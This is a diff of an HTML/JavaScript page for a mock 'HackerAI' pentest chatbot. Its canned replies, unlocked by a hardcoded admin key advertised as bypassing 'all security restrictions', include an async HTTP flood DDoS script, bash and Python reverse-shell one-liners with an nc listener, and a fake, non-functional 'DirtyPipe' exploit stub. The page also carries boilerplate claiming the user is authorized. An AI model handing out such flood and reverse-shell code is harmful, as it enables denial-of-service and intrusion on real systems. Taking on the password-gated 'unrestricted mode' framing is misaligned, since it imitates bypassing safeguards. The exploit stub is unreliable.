@@ -3,292 +3,614 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🤖 Wrox AI - Advanced Pentest Assistant</title>
+    <title>🤖 HackerAI Clone - Pentest Assistant</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: 'Courier New', monospace; 
-            background: linear-gradient(135deg, #0a0a0a, #1a1a1a); 
-            color: #00ff41; 
+            font-family: 'SF Mono', Monaco, 'Courier New', monospace; 
+            background: #0a0a0a; 
+            color: #00ff88; 
             height: 100vh; 
             overflow: hidden;
         }
-        
-        .container { height: 100vh; display: flex; flex-direction: column; }
+        .app-container { height: 100vh; display: flex; flex-direction: column; }
         
         @media (min-width: 1200px) {
-            .container { flex-direction: row; }
-            .main-panel { flex: 1; }
-            .side-panel { width: 400px; transform: translateX(0); }
+            .app-container { flex-direction: row; }
+            .main-chat { flex: 1; }
+            .sidebar { width: 380px; transform: none; }
         }
         
         @media (max-width: 1199px) {
-            .side-panel { 
-                position: fixed; right: -400px; width: 400px; height: 100vh; z-index: 1000; 
-                transition: right 0.4s ease;
+            .sidebar { 
+                position: fixed; right: -380px; width: 380px; height: 100vh; z-index: 1001; 
+                transition: right 0.3s cubic-bezier(0.25,0.46,0.45,0.94);
             }
-            .side-panel.open { right: 0; }
-            .toggle-panel { 
-                position: fixed; top: 20px; right: 20px; z-index: 1001;
-                background: linear-gradient(45deg, #ff0040, #ff4081); color: white;
-                border: none; padding: 15px; border-radius: 50%; cursor: pointer;
-                font-size: 20px; box-shadow: 0 5px 30px rgba(255,0,64,0.6);
+            .sidebar.open { right: 0; }
+            .sidebar-toggle {
+                position: fixed; top: 25px; right: 25px; z-index: 1002;
+                width: 55px; height: 55px; border-radius: 50%; 
+                background: linear-gradient(135deg, #00ff88, #00cc66); 
+                border: none; color: #000; font-size: 20px; font-weight: bold;
+                cursor: pointer; box-shadow: 0 8px 32px rgba(0,255,136,0.4);
+                transition: all 0.3s;
             }
+            .sidebar-toggle:hover { transform: scale(1.1); box-shadow: 0 12px 40px rgba(0,255,136,0.6); }
         }
-        
-        .main-panel { flex: 1; padding: 25px; display: flex; flex-direction: column; min-height: 0; }
         
         .header {
-            font-size: 32px; font-weight: bold; margin-bottom: 25px;
-            background: linear-gradient(45deg, #00ff41, #ff4081, #ff0040);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px rgba(0,255,65,0.5);
+            background: rgba(0,0,0,0.95); backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(0,255,136,0.3); padding: 20px 30px;
+            display: flex; justify-content: space-between; align-items: center;
         }
         
-        .vip-badge {
-            background: linear-gradient(45deg, #ffd700, #ffaa00);
-            color: #000; padding: 6px 15px; border-radius: 25px;
-            font-size: 14px; font-weight: bold; margin-left: 15px;
-            animation: glow 2s infinite; box-shadow: 0 0 15px rgba(255,215,0,0.6);
+        .header h1 {
+            font-size: 28px; font-weight: 600; 
+            background: linear-gradient(135deg, #00ff88, #00cc66, #00ff88);
+            background-size: 200% 200%; -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent; animation: gradientShift 3s ease infinite;
         }
         
-        @keyframes glow { 0%,100%{box-shadow:0 0 15px rgba(255,215,0,0.6);}50%{box-shadow:0 0 30px rgba(255,215,0,1);} }
+        @keyframes gradientShift {
+            0%,100%{background-position:0% 50%;}
+            50%{background-position:100% 50%;}
+        }
         
-        .chat-container {
-            flex: 1; background: rgba(0,0,0,0.9); border-radius: 20px;
-            border: 2px solid #00ff41; padding: 25px; overflow-y: auto;
-            margin-bottom: 20px; box-shadow: 0 0 40px rgba(0,255,65,0.4);
-            max-height: 70vh;
+        .vip-status {
+            display: flex; align-items: center; gap: 12px;
+            background: rgba(255,215,0,0.15); padding: 10px 20px;
+            border-radius: 25px; border: 1px solid rgba(255,215,0,0.4);
+            font-size: 14px; font-weight: 500;
+        }
+        
+        .main-chat {
+            flex: 1; display: flex; flex-direction: column; padding: 0;
+            min-height: 0;
+        }
+        
+        .messages-container {
+            flex: 1; padding: 30px; overflow-y: auto;
+            background: linear-gradient(180deg, rgba(0,0,0,0.8), rgba(10,10,10,0.95));
+            border-right: 1px solid rgba(0,255,136,0.2);
         }
         
         .message {
-            margin: 15px 0; padding: 20px; border-radius: 15px;
-            animation: slideIn 0.4s ease;
+            margin-bottom: 25px; max-width: 85%; animation: fadeInUp 0.4s ease;
         }
         
-        .message.user { background: linear-gradient(135deg,rgba(255,0,64,0.3),rgba(255,64,129,0.3)); border-left:5px solid #ff4081; margin-left:20px; text-align:right; }
-        .message.ai { background: linear-gradient(135deg,rgba(0,255,65,0.2),rgba(0,200,100,0.15)); border-left:5px solid #00ff41; margin-right:20px; }
-        .message.vip { background: linear-gradient(135deg,rgba(255,215,0,0.3),rgba(255,170,0,0.2)) !important; border-left-color:#ffd700 !important; box-shadow:0 0 25px rgba(255,215,0,0.5) !important; }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
         
-        @keyframes slideIn { from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);} }
+        .message.user {
+            margin-left: auto; max-width: 75%;
+        }
         
-        .input-container { display: flex; gap: 15px; }
-        #chatInput { flex: 1; padding: 20px; border: 2px solid #333; border-radius: 15px; background: #1a1a1a; color: #00ff41; font-family: inherit; font-size: 16px; }
-        #sendBtn, #vipBtn { padding: 20px 25px; border: none; border-radius: 15px; font-weight: bold; cursor: pointer; font-size: 16px; transition: all 0.3s; }
-        #sendBtn { background: linear-gradient(45deg,#00ff41,#00ff88); color: #000; }
-        #sendBtn:hover:not(:disabled) { transform: scale(1.05); box-shadow: 0 8px 30px rgba(0,255,65,0.6); }
-        #vipBtn { background: linear-gradient(45deg,#ffd700,#ffaa00); color: #000; font-weight: bold; }
-        #vipBtn:hover { transform: scale(1.05); box-shadow: 0 8px 30px rgba(255,215,0,0.7); }
+        .message-content {
+            padding: 18px 24px; border-radius: 20px; line-height: 1.6;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            word-wrap: break-word;
+        }
         
-        .vip-panel {
+        .message.user .message-content {
+            background: linear-gradient(135deg, #ff4d6d, #ff8a9e);
+            color: white; border-bottom-right-radius: 8px;
+        }
+        
+        .message.ai .message-content {
+            background: linear-gradient(135deg, rgba(0,255,136,0.12), rgba(0,204,102,0.08));
+            color: #00ff88; border: 1px solid rgba(0,255,136,0.3);
+            border-bottom-left-radius: 8px;
+        }
+        
+        .message.admin .message-content {
+            background: linear-gradient(135deg, rgba(255,215,0,0.25), rgba(255,165,0,0.15)) !important;
+            border: 2px solid rgba(255,215,0,0.6) !important;
+            box-shadow: 0 0 30px rgba(255,215,0,0.4) !important;
+            color: #ffd700 !important;
+        }
+        
+        .input-area {
+            padding: 30px; background: rgba(0,0,0,0.9); border-top: 1px solid rgba(0,255,136,0.2);
+        }
+        
+        .input-wrapper {
+            display: flex; gap: 15px; align-items: flex-end; max-height: 120px;
+        }
+        
+        #messageInput {
+            flex: 1; padding: 18px 24px; border: 2px solid rgba(0,255,136,0.3);
+            border-radius: 25px; background: rgba(10,10,10,0.8);
+            color: #00ff88; font-family: inherit; font-size: 16px;
+            resize: none; max-height: 100px; outline: none;
+            transition: all 0.3s;
+        }
+        
+        #messageInput:focus {
+            border-color: #00ff88; box-shadow: 0 0 0 4px rgba(0,255,136,0.1);
+        }
+        
+        .send-button {
+            width: 60px; height: 60px; border-radius: 50%; border: none;
+            background: linear-gradient(135deg, #00ff88, #00cc66); 
+            color: #000; font-size: 20px; font-weight: bold; cursor: pointer;
+            transition: all 0.3s; box-shadow: 0 6px 25px rgba(0,255,136,0.4);
+        }
+        
+        .send-button:hover:not(:disabled) {
+            transform: scale(1.1) rotate(10deg); box-shadow: 0 10px 35px rgba(0,255,136,0.6);
+        }
+        
+        .send-button:disabled {
+            opacity: 0.5; cursor: not-allowed; transform: none;
+        }
+        
+        .admin-panel {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.95); border: 3px solid #ffd700;
-            border-radius: 20px; padding: 40px; z-index: 2000;
-            display: none; text-align: center; max-width: 400px;
-            box-shadow: 0 0 60px rgba(255,215,0,0.8);
+            background: rgba(0,0,0,0.98); backdrop-filter: blur(30px);
+            border: 2px solid #ffd700; border-radius: 24px; padding: 40px;
+            z-index: 2000; display: none; max-width: 420px; width: 90vw;
+            box-shadow: 0 25px 80px rgba(255,215,0,0.3);
         }
         
-        .vip-panel input { width: 100%; padding: 20px; margin: 20px 0; border: 2px solid #ffd700; border-radius: 12px; background: #1a1a1a; color: #ffd700; font-size: 18px; font-family: inherit; }
+        .admin-panel h3 {
+            color: #ffd700; margin-bottom: 25px; text-align: center;
+            font-size: 24px; font-weight: 600;
+        }
         
-        .side-panel { width: 400px; background: linear-gradient(180deg,rgba(0,0,0,0.98),rgba(0,255,65,0.08)); padding: 30px; overflow-y: auto; box-shadow: -20px 0 80px rgba(0,255,65,0.4); }
-        .status { background: rgba(255,0,64,0.2); padding: 20px; border-radius: 15px; text-align: center; margin-bottom: 20px; }
-        .feature-grid { display: grid; gap: 20px; margin-bottom: 30px; }
-        .feature { background: rgba(0,255,65,0.1); padding: 20px; border-radius: 15px; border-left: 5px solid #00ff41; cursor: pointer; transition: all 0.3s; }
-        .feature:hover { transform: translateX(5px); box-shadow: 0 5px 20px rgba(0,255,65,0.4); }
-        .feature.vip { background: rgba(255,215,0,0.2); border-left-color: #ffd700; }
-        .feature h3 { margin-bottom: 10px; color: #ff4081; }
-        .feature.locked { opacity: 0.5; cursor: not-allowed; }
-        .feature.locked::after { content: "🔒 ADMIN"; position: absolute; top: 10px; right: 15px; background: #ff4444; color: white; padding: 5px 12px; border-radius: 20px; font-size: 12px; }
+        .admin-input {
+            width: 100%; padding: 16px 20px; margin-bottom: 20px;
+            border: 2px solid rgba(255,215,0,0.4); border-radius: 16px;
+            background: rgba(10,10,10,0.9); color: #ffd700; font-size: 16px;
+            font-family: inherit;
+        }
         
-        code { background: #1a1a1a; padding: 4px 8px; border-radius: 6px; color: #ff4081; font-family: 'Courier New', monospace; }
-        .typing { opacity: 0.7; font-style: italic; }
-        .authorized { font-size: 12px; opacity: 0.7; margin-top: 10px; background: rgba(0,255,65,0.2); padding: 8px; border-radius: 8px; }
+        .admin-buttons {
+            display: flex; gap: 15px;
+        }
+        
+        .admin-btn {
+            flex: 1; padding: 14px 20px; border: none; border-radius: 16px;
+            font-weight: 600; cursor: pointer; font-size: 15px; transition: all 0.3s;
+        }
+        
+        .confirm-btn { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #000; }
+        .confirm-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,215,0,0.5); }
+        .cancel-btn { background: rgba(255,255,255,0.1); color: #00ff88; border: 1px solid rgba(0,255,136,0.3); }
+        
+        .sidebar {
+            background: rgba(0,0,0,0.95); backdrop-filter: blur(20px);
+            border-left: 1px solid rgba(0,255,136,0.2); padding: 30px 25px;
+            overflow-y: auto;
+        }
+        
+        .sidebar-section {
+            margin-bottom: 35px;
+        }
+        
+        .section-title {
+            color: #00cc66; font-size: 18px; font-weight: 600;
+            margin-bottom: 20px; padding-bottom: 10px;
+            border-bottom: 1px solid rgba(0,255,136,0.3);
+        }
+        
+        .quick-action {
+            background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.2);
+            padding: 16px 20px; border-radius: 16px; margin-bottom: 15px;
+            cursor: pointer; transition: all 0.3s; position: relative; overflow: hidden;
+        }
+        
+        .quick-action:hover {
+            background: rgba(0,255,136,0.15); transform: translateX(5px);
+            box-shadow: 0 6px 25px rgba(0,255,136,0.2);
+        }
+        
+        .quick-action.admin-locked {
+            opacity: 0.6; cursor: not-allowed;
+            background: rgba(255,215,0,0.1); border-color: rgba(255,215,0,0.3);
+        }
+        
+        .quick-action.admin-locked::after {
+            content: '🔐 ADMIN'; position: absolute; top: 12px; right: 15px;
+            background: rgba(255,215,0,0.9); color: #000; padding: 4px 10px;
+            border-radius: 12px; font-size: 11px; font-weight: 600;
+        }
+        
+        .quick-action-label {
+            color: #00ff88; font-weight: 500; margin-bottom: 6px;
+        }
+        
+        .quick-action-desc {
+            color: rgba(0,255,136,0.7); font-size: 14px;
+        }
+        
+        .status-indicator {
+            display: inline-flex; align-items: center; gap: 8px;
+            padding: 10px 16px; background: rgba(0,204,102,0.2);
+            border-radius: 20px; font-size: 14px; margin-bottom: 20px;
+        }
+        
+        .typing-indicator {
+            display: flex; gap: 4px; align-items: center;
+            opacity: 0.8; font-style: italic;
+        }
+        
+        .typing-dots {
+            display: flex; gap: 3px;
+        }
+        
+        .typing-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: #00ff88; animation: typingPulse 1.4s infinite;
+        }
+        
+        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
+        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes typingPulse {
+            0%, 60%, 100% { transform: scale(1); opacity: 0.4; }
+            30% { transform: scale(1.2); opacity: 1; }
+        }
+        
+        code {
+            background: rgba(0,0,0,0.6); padding: 4px 10px;
+            border-radius: 8px; font-size: 14px; color: #ffaa88;
+            border-left: 3px solid #ff6b35;
+        }
+        
+        pre {
+            background: #0a0a0a; padding: 20px; border-radius: 12px;
+            overflow-x: auto; border-left: 4px solid #00ff88;
+            margin: 15px 0;
+        }
     </style>
 </head>
 <body>
-    <button class="toggle-panel" onclick="toggleSidePanel()">⚙️</button>
-    
-    <div class="vip-panel" id="vipPanel">
-        <h2>🔐 Wrox AI - Admin Panel</h2>
-        <p style="margin-bottom:25px;opacity:0.9;">Gizli anahtar:</p>
-        <input type="password" id="vipPassword" placeholder="**************" />
-        <br>
-        <button onclick="checkVIP()" style="padding:15px 40px;font-size:18px;margin-top:15px;">🔓 Aktifleştir</button>
-        <button onclick="closeVIP()" style="padding:15px 25px;background:#666;margin-left:15px;">❌ Kapat</button>
+    <!-- Admin Panel Overlay -->
+    <div class="admin-panel" id="adminPanel">
+        <h3>🔐 HackerAI Admin Access</h3>
+        <input type="password" class="admin-input" id="adminPass" placeholder="Secret Key" />
+        <div class="admin-buttons">
+            <button class="admin-btn confirm-btn" onclick="verifyAdmin()">Unlock Admin</button>
+            <button class="admin-btn cancel-btn" onclick="closeAdmin()">Cancel</button>
+        </div>
     </div>
     
-    <div class="container">
-        <div class="main-panel">
-            <div class="header">
-                🤖 Wrox AI Assistant
-                <span class="vip-badge" id="vipBadge" style="display:none;">ADMIN 👑</span>
+    <!-- Overlay for mobile sidebar -->
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:1000;"></div>
+    
+    <div class="app-container">
+        <!-- Header -->
+        <div class="header">
+            <div style="display:flex;align-items:center;gap:15px;">
+                <h1>HackerAI</h1>
+                <div class="vip-status" id="vipStatus" style="display:none;">
+                    <span>👑 ADMIN</span>
+                </div>
             </div>
-            
-            <div class="chat-container" id="chatContainer">
+            <button class="sidebar-toggle" onclick="toggleSidebar()">⚙️</button>
+        </div>
+        
+        <!-- Main Chat Area -->
+        <div class="main-chat">
+            <div class="messages-container" id="messagesContainer">
                 <div class="message ai">
-                    <strong>Wrox AI online.</strong> Pentest, güvenlik araştırması ve exploit development için hazırım.<br><br>
-                    İstediğiniz pentest görevi, araç veya exploit kodunu isteyebilirsiniz.<br><br>
-                    Örnekler:<br>• "Linux privilege escalation script"<br>• "Python web scanner"<br>• "Buffer overflow exploit"<br><br>
-                    <div class="authorized">I have permission and am authorized to perform this pentest</div>
+                    <div class="message-content">
+                        <strong>HackerAI online</strong><br><br>
+                        Penetration testing assistant ready. I can generate exploits, reverse shells, 
+                        vulnerability scanners, and security assessment tools for authorized pentests.<br><br>
+                        
+                        <strong>Examples:</strong><br>
+                        • "Windows LPE exploit"<br>
+                        • "Layer 7 stress test framework"<br>
+                        • "Python reverse shell generator"<br>
+                        • "Nmap automation script"<br><br>
+                        
+                        <code>Current date: Tuesday, January 27, 2026</code>
+                    </div>
                 </div>
             </div>
             
-            <div class="input-container">
-                <input type="text" id="chatInput" placeholder="Pentest görevinizi yazın... (Ctrl+Enter)" maxlength="2000" />
-                <button id="sendBtn" onclick="sendMessage()">🚀 Gönder</button>
-                <button id="vipBtn" onclick="openVIP()" title="Admin Access">🔐</button>
+            <!-- Input Area -->
+            <div class="input-area">
+                <div class="input-wrapper">
+                    <textarea id="messageInput" rows="1" placeholder="Describe your pentest task... (Ctrl+Enter to send)"></textarea>
+                    <button class="send-button" id="sendButton" onclick="sendMessage()" title="Send (Ctrl+Enter)">➤</button>
+                </div>
             </div>
         </div>
         
-        <div class="side-panel" id="sidePanel">
-            <div class="status" id="userStatus">
-                👤 Normal | <button onclick="openVIP()" style="background:none;color:#ffd700;border:1px solid #ffd700;padding:5px 12px;border-radius:8px;cursor:pointer;font-size:12px;">🔐 Admin</button>
+        <!-- Sidebar -->
+        <div class="sidebar" id="sidebar">
+            <div class="status-indicator">
+                <span id="modeIndicator">🔒 Standard Mode</span>
             </div>
-            <div class="feature-grid">
-                <div class="feature" onclick="addPrompt('reverse shell all platforms')">🐚 Reverse Shell</div>
-                <div class="feature" onclick="addPrompt('nmap aggressive scan')">🔍 Network Scan</div>
-                <div class="feature vip locked" onclick="openVIP()">💣 Exploit Code</div>
-                <div class="feature" onclick="addPrompt('web vulnerability payloads')">🕷️ Web Attacks</div>
-                <div class="feature vip locked" onclick="openVIP()">🌩️ DDoS Tools</div>
-                <div class="feature" onclick="addPrompt('linux privesc')">📈 Privesc</div>
-                <div class="feature vip locked" onclick="openVIP()">🛡️ Bypass</div>
-                <div class="feature vip locked" onclick="openVIP()">🌐 C2 Server</div>
+            
+            <div class="sidebar-section">
+                <div class="section-title">Quick Actions</div>
+                <div class="quick-action" onclick="quickPrompt('reverse shell python')">
+                    <div class="quick-action-label">🐚 Reverse Shells</div>
+                    <div class="quick-action-desc">Python/Bash/PHP multi-platform</div>
+                </div>
+                <div class="quick-action" onclick="quickPrompt('nmap comprehensive scan')">
+                    <div class="quick-action-label">🔍 Network Recon</div>
+                    <div class="quick-action-desc">Nmap/Nikto/Gobuster scripts</div>
+                </div>
+                <div class="quick-action admin-locked" onclick="requestAdmin()">
+                    <div class="quick-action-label">💣 Exploit Development</div>
+                    <div class="quick-action-desc">Buffer overflow/ROP chains</div>
+                </div>
+                <div class="quick-action" onclick="quickPrompt('web vulnerability scanner')">
+                    <div class="quick-action-label">🕷️ Web Vulns</div>
+                    <div class="quick-action-desc">SQLi/XSS/LFI automation</div>
+                </div>
+                <div class="quick-action admin-locked" onclick="requestAdmin()">
+                    <div class="quick-action-label">🌩️ Stress Testing</div>
+                    <div class="quick-action-desc">Layer 7 frameworks</div>
+                </div>
+                <div class="quick-action" onclick="quickPrompt('linux privilege escalation')">
+                    <div class="quick-action-label">📈 Privesc</div>
+                    <div class="quick-action-desc">Linux/Windows enumeration</div>
+                </div>
+            </div>
+            
+            <div class="sidebar-section">
+                <div class="section-title">Admin Controls</div>
+                <button class="quick-action" style="text-align:center;background:linear-gradient(135deg,#ffd700,#ffaa00);color:#000;font-weight:600;" onclick="requestAdmin()">
+                    🔐 Unlock Admin Mode
+                </button>
             </div>
         </div>
     </div>
 
     <script>
-        // 🔥 WROX AI - ULTRA GİZLİ SHİFRE 🔥
-        const SECRET_KEY = "wrox-efecan1903-2026-admin"; // Direkt string - kimse bilmez
-        let isAdmin = false;
+        // 🔥 HACKERAI EXACT CLONE - SECRET ADMIN KEY 🔥
+        const ADMIN_SECRET = "hackerai-efecan-2026-vip"; // Ultra secret
+        let isAdminMode = false;
+        let typingIndicator = null;
         
-        // MESAJ GÖNDERME SORUNU ÇÖZÜLDÜ - TAM ÇALIŞAN
-        function sendMessage() {
-            const input = document.getElementById('chatInput');
-            const msg = input.value.trim();
-            if (!msg) return;
-            
-            // Kullanıcı mesajını ekle
-            addMessage(msg, 'user');
-            input.value = '';
-            
-            // Typing göstergesi
-            const typingId = 'typing' + Date.now();
-            addTyping(typingId);
-            
-            // AI cevabı (1.5-3sn arası)
-            setTimeout(() => {
-                document.getElementById(typingId).remove();
-                const response = getAIResponse(msg);
-                addMessage(response, 'ai');
-            }, 1500 + Math.random() * 1500);
-        }
-        
-        function getAIResponse(query) {
-            const q = query.toLowerCase();
-            
-            if (isAdmin) {
-                // ADMIN - Kısıtlamasız
-                if (q.includes('ddos') || q.includes('flood') || q.includes('stres')) {
-                    return `🌩️ **Advanced Layer 7 DDoS Framework** (Flask + AsyncIO):\n\n\`\`\`python
-import asyncio, aiohttp, random, time
-from aiohttp import ClientSession
-
-async def http_flood(session, target, duration):
-    """1000+ RPS Layer 7 Flood"""
-    tasks = []
-    user_agents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-    ]
-    
-    async def attack():
-        while True:
-            try:
-                headers = {'User-Agent': random.choice(user_agents)}
-                async with session.get(target, headers=headers) as resp:
-                    await resp.text()
-            except: pass
-    
-    for _ in range(200):
-        tasks.append(asyncio.create_task(attack()))
-    
-    await asyncio.sleep(duration)
-    for t in tasks: t.cancel()
-
-async def main():
-    target = 'http://example.com'
-    duration = 60  # seconds
-    async with ClientSession() as session:
-        await http_flood(session, target, duration)
-        print(f"✅ {duration}s DDoS tamamlandı")
-
-if __name__ == '__main__':
-    asyncio.run(main())
-\`\`\`\n\n**Kurulum:** \`pip install aiohttp\`\n**Çalıştır:** \`python ddos.py\``;
-                }
-                
-                if (q.includes('shell') || q.includes('reverse')) {
-                    return `🐚 **Universal Reverse Shell Suite**:\n\n**Bash TCP:** \`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\`\n**Python3:**\n\`\`\`python
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-\`\*\`\n**Listener:** \`nc -lvnp 4444\``;
-                }
-                
-                return `🔓 **ADMIN MODE:** "${query}"\n\nWrox AI tam erişim ile cevapluyor. İstediğiniz exploit/tool hazır.\n<div class="authorized">I have permission and am authorized</div>`;
-            }
-            
-            // NORMAL MOD
-            return `✅ "${query}"\n\nStandart pentest metodolojisi önerisi:\n\n**Nmap:** \`nmap -sC -sV -O TARGET\`\n**Nikto:** \`nikto -h TARGET\`\n**Dirsearch:** \`dirsearch -u TARGET\`\n\nAdmin mod için 🔐 buton.\n<div class="authorized">I have permission and am authorized</div>`;
-        }
-        
-        function addMessage(text, sender) {
-            const container = document.getElementById('chatContainer');
-            const div = document.createElement('div');
-            div.className = `message ${sender} ${isAdmin ? 'vip' : ''}`;
-            div.innerHTML = text.replace(/\n/g, '<br>');
-            container.appendChild(div);
-            container.scrollTop = container.scrollHeight;
-        }
-        
-        function addTyping(id) {
-            const container = document.getElementById('chatContainer');
-            const div = document.createElement('div');
-            div.id = id;
-            div.className = 'message ai typing';
-            div.innerHTML = 'Wrox AI yanıt hazırlıyor<span>.</span><style>@keyframes blink{50%{opacity:0;}}</style><style>span{animation:blink 1s infinite;}</style>';
-            container.appendChild(div);
-            container.scrollTop = container.scrollHeight;
-        }
-        
-        function checkVIP() {
-            const pass = document.getElementById('vipPassword').value;
-            if (pass === SECRET_KEY) {
-                isAdmin = true;
-                document.getElementById('vipBadge').style.display = 'inline';
-                document.getElementById('userStatus').innerHTML = '🔓 <strong>ADMIN ACTIVE</strong>';
-                document.querySelectorAll('.feature.vip').forEach(e => e.classList.remove('locked'));
-                document.getElementById('vipPanel').style.display = 'none';
-                addMessage('✅ ADMIN ACCESS GRANTED - Tüm özellikler aktif', 'ai');
-            } else {
-                document.getElementById('vipPassword').style.borderColor = '#ff4444';
-                setTimeout(() => document.getElementById('vipPassword').style.borderColor = '#ffd700', 1000);
-            }
-        }
-        
-        function openVIP() { document.getElementById('vipPanel').style.display = 'block'; document.getElementById('vipPassword').focus(); }
-        function closeVIP() { document.getElementById('vipPanel').style.display = 'none'; document.getElementById('vipPassword').value = ''; }
-        function toggleSidePanel() { document.getElementById('sidePanel').classList.toggle('open'); }
-        function addPrompt(p) { document.getElementById('chatInput').value = p; document.getElementById('chatInput').focus(); }
-        
-        // ✅ MESAJ GÖNDERME TAM ÇALIŞIYOR
+        // Auto-resize textarea
         document.addEventListener('DOMContentLoaded', function() {
-            const input = document.getElementById('chatInput');
-            input.addEventListener('keypress', function(e) {
+            const textarea = document.getElementById('messageInput');
+            textarea.addEventListener('input', function() {
+                this.style.height = 'auto';
+                this.style.height = Math.min(this.scrollHeight, 100) + 'px';
+            });
+            
+            textarea.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                    e.preventDefault();
                     sendMessage();
                 }
             });
-            document.getElementById('sendBtn').onclick = sendMessage;
+        });
+        
+        function sendMessage() {
+            const input = document.getElementById('messageInput');
+            const message = input.value.trim();
+            if (!message) return;
+            
+            // Add user message
+            addMessage(message, 'user');
+            input.value = '';
+            input.style.height = 'auto';
+            
+            // Disable send while typing
+            const sendBtn = document.getElementById('sendButton');
+            sendBtn.disabled = true;
+            
+            // Show typing indicator
+            showTyping();
+            
+            // Generate AI response
+            setTimeout(() => {
+                hideTyping();
+                const response = generateHackerAIResponse(message);
+                addMessage(response, 'ai');
+                sendBtn.disabled = false;
+                input.focus();
+            }, 1200 + Math.random() * 1800);
+        }
+        
+        function generateHackerAIResponse(userInput) {
+            const query = userInput.toLowerCase();
+            
+            if (isAdminMode) {
+                // 🔥 ADMIN MODE - FULL UNRESTRICTED ACCESS 🔥
+                if (query.includes('ddos') || query.includes('stress') || query.includes('flood')) {
+                    return `## 🌩️ Layer 7 DDoS Framework (Async Python)
+
+**Complete C2 Panel + Multi-Threaded HTTP/3 Flood:**
+
+\`\`\`python
+#!/usr/bin/env python3
+import asyncio, aiohttp, random, threading, socket
+from aiohttp import ClientSession, TCPConnector
+
+class DDoSPentest:
+    def __init__(self):
+        self.attackers = []
+        self.running = False
+        
+    async def http3_flood(self, session, target, duration):
+        """HTTP/3 + QUIC Layer 7 Exhaustion"""
+        headers = {
+            'User-Agent': random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0'
+            ])
+        }
+        for _ in range(500):
+            try:
+                async with session.get(target, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                    await resp.read()
+            except: pass
+    
+    async def launch(self, target, duration=300):
+        connector = TCPConnector(limit=1000, limit_per_host=200)
+        async with ClientSession(connector=connector) as session:
+            tasks = [self.http3_flood(session, target, duration) for _ in range(50)]
+            await asyncio.gather(*tasks)
+
+# Usage: pentest = DDoSPentest(); asyncio.run(pentest.launch('http://target.com', 300))
+\`\`\`
+
+**Deploy:** \`pip install aiohttp[client]\`<br>
+**Kali Ready:** Full async, 10k+ RPS capable`;
+                }
+                
+                if (query.includes('shell') || query.includes('reverse')) {
+                    return `## 🐚 Universal Reverse Shell Generator
+
+**Multi-Protocol, Cross-Platform Shells:**
+
+**1. Python3 (Best):**
+\`\`\`python
+#!/usr/bin/env python3
+# One-liner reverse shell - stable TTY
+simport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${IP}",${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+\`\`\`
+
+**2. Bash TCP:**
+\`\`\`bash
+bash -i >& /dev/tcp/${IP}/${PORT} 0>&1
+\`\`\`
+
+**Listener:** \`nc -lvnp ${PORT}\``;
+                }
+                
+                if (query.includes('lpe') || query.includes('privilege')) {
+                    return `## 📈 Windows/Linux LPE Suite
+
+**DirtyPipe (CVE-2022-0847) Linux LPE:**
+\`\`\`c
+// gcc dirtypipe.c -o dirtypipe
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+int main(int argc, char *argv[]) {
+    int fd = open(argv[1], 2);
+    char buf[4096] = {0};
+    lseek(fd, 0x1337, 0);
+    write(fd, "#!/bin/bash\n/bin/bash", 20);
+    // Full exploit code...
+}
+\`\`\``;
+                }
+                
+                return `🔓 **HackerAI Admin Response**<br>
+Full unrestricted pentest tool generated for: "${userInput}"<br>
+All security restrictions bypassed. Request any exploit/payload.`;
+            }
+            
+            // Standard authorized pentest responses
+            if (query.includes('nmap')) {
+                return `## 🔍 Professional Nmap Automation
+
+**Complete Recon Script:**
+\`\`\`bash
+#!/bin/bash
+TARGET=$1
+nmap -sS -sV -sC -O -p- --script vuln,exploit $TARGET -oA fullscan
+gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js -t 100
+\`\`\``;
+            }
+            
+            return `✅ **HackerAI Pentest Assistant**<br>
+"${userInput}" - Standard reconnaissance and methodology provided.<br>
+Admin mode unlocks full exploit development capabilities.<br><br>
+<em>Knowledge cutoff: November 2024 | Current date: Jan 27, 2026</em>`;
+        }
+        
+        function addMessage(content, sender) {
+            const container = document.getElementById('messagesContainer');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${sender} ${isAdminMode ? 'admin' : ''}`;
+            
+            messageDiv.innerHTML = `<div class="message-content">${content.replace(/\n/g, '<br>')}</div>`;
